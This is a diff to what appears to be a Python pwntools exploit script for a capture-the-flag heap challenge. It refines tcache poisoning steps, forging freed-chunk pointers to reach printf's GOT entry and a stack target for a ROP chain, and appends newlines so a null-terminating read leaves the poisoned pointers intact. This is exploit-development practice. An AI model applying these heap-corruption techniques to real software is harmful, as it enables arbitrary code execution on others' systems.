@@ -155,7 +155,9 @@ def main():
     ov[ch:ch + 8]         = p64(0)
     ov[ch + 8:ch + 0x10]  = p64(0x101)
     ov[c1_off:c1_off + 8] = p64(fd)
-    change(1, bytes(ov))
+    # trailing '\n': read_with_null then truncates the newline (buf[n-1]=0) instead
+    # of writing a stray NUL over the byte after the poisoned fd (deterministic).
+    change(1, bytes(ov) + b"\n")
     add(0xe8, b"take-c1\n")     # returns C1
     bp = bytearray(b"\x00" * 0x84); bp[0:8] = p64(pie + exe.got["printf"]); bp[0x80:0x84] = p32(1)
     add(0xe8, bytes(bp))        # index 3 == fake bss node
@@ -192,7 +194,8 @@ def main():
     ov2[ch:ch + 8]         = p64(0)
     ov2[ch + 8:ch + 0x10]  = p64(0x101)
     ov2[c1_off:c1_off + 8] = p64(fd2)
-    change(1, bytes(ov2))
+    # trailing '\n' keeps the poisoned fd2 intact regardless of its high byte
+    change(1, bytes(ov2) + b"\n")
     add(0xe8, b"dummy\n")       # returns C1, tcache head = stack_target
 
     # ---- 5. ROP chain written by the final add() ----
